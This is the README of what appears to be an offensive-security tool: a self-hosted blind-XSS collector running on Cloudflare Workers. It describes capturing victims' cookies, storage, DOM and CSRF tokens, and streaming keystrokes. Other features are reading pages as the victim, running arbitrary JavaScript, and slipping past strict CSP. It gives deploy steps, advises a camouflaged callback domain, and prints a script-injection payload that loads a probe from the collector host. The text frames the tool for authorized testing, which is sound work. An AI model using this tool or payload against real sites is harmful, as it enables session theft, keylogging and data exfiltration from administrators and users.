# blind-xss-collector

A **self-hosted, interactive blind-XSS collector** on Cloudflare Workers + D1.
Same job as XSS Hunter / ezXSS, but the callback data (client DOM, cookies, storage)
stays on **your own** Cloudflare account — no third-party sees engagement data.

> **Authorized testing only.** Blind XSS fires in someone else's browser session
> (often a support agent / admin). Only inject probes into targets you are authorized
> to test, keep proofs minimal, do not read real user data beyond what proves impact,
> and purge callback data at engagement close. This is a defensive tool: find the
> stored-XSS sink so the client can fix it. Every injection point is a logged active
> request (§2 hooks) — record the token → surface mapping in the session file.

## What it captures

**Automatically, the instant the probe fires:**
- fire URL + page title + origin  → *which* injection point executed, and in whose panel
- victim IP (server-side), User-Agent, browser/device fingerprint
- `document.cookie` (non-HttpOnly), `localStorage`, `sessionStorage`
- full **DOM snapshot** of the victim's authenticated page
- every form / hidden input (pre-filled admin values, CSRF tokens), `<meta>` tags

**Interactively, while the victim tab stays open** (probe long-polls every 5s):
- `dom` / `cookies` / `storage` / `forms` — re-dump fresh
- `fetch:<url>` — request a **same-origin** URL *with the victim's cookies* and return the
  body (read `/admin`, internal APIs, other users' data — in-browser CSRF-read)
- `keylog:<selector>` — stream keystrokes
- `screenshot` — best-effort via html2canvas (needs `script-src` to allow the CDN)
- `eval:<js>` — run arbitrary JS in victim context

**CSP-aware exfil:** the probe tries `fetch`(CORS) → `navigator.sendBeacon` → chunked
`Image()` GET (reassembled server-side), so data still escapes a strict `connect-src`
as long as `img-src` allows the collector host.

## Deploy (one-time)

```sh
cd tools/blind-xss-collector
npm i -g wrangler                      # or: npx wrangler ...
wrangler login
wrangler d1 create bxss                # copy the database_id into wrangler.toml
wrangler d1 execute bxss --remote --file=schema.sql
wrangler secret put AUTH_KEY           # dashboard password (pick a long random string)
wrangler deploy
```

Point a Cloudflare **custom domain** at the worker (Workers → Triggers → Custom Domain)
so the callback host looks innocuous, e.g. `https://cdn-metrics.example.net`.

Dashboard: `https://<your-worker-host>/?key=YOUR_AUTH_KEY`

Local dev: `wrangler dev` (add `AUTH_KEY` under `[vars]` in `wrangler.toml` for dev only;
use `--local` D1 or `d1 execute bxss --local --file=schema.sql`).

## Use

1. Pick a **unique token per injection point** (e.g. `t01-supportform`, `t02-ua-header`).
   The token is echoed back on every callback so you know exactly which surface fired.
2. Inject a delivery payload (see `payloads.md`) pointing at
   `https://<host>/c/<token>`. Example baseline:
   ```html
   "><script src=//<host>/c/t01-supportform></script>
   ```
3. Wait. When it fires you get a session row in the dashboard; click it to see the
   capture and issue interactive commands.

## Files
- `src/worker.js` — router (collector endpoints + auth-gated dashboard API)
- `src/probe.js` — the injectable probe (served with token/base substituted)
- `src/dashboard.js` — operator UI
- `schema.sql` — D1 tables
- `payloads.md` — delivery payloads per injection context + CSP channel notes

## Purge (engagement close)
```sh
wrangler d1 execute bxss --remote --command "DELETE FROM reports; DELETE FROM sessions; DELETE FROM commands; DELETE FROM chunks;"
```

## Tests
Execution-verified (no cloud deploy needed — a D1-compatible `node:sqlite` adapter runs the
real `worker.js`):
- `npm test` — 24 server-side assertions against the real worker (report store, dashboard
  auth gate, interactive command lifecycle, chunked image-beacon reassembly).
- `npm run test:e2e` — 13 assertions driving **real headless Chrome** as the victim against a
  mock admin-log-viewer app: probe fires from a stored payload, collects real
  DOM/cookies/localStorage/CSRF-token, exfils cross-origin, `fetch`-as-victim reads a
  protected same-origin page with the victim's cookie, and — under a strict CSP
  (`connect-src 'self'`) — falls back to the `img-src` image-beacon. Requires Google Chrome.
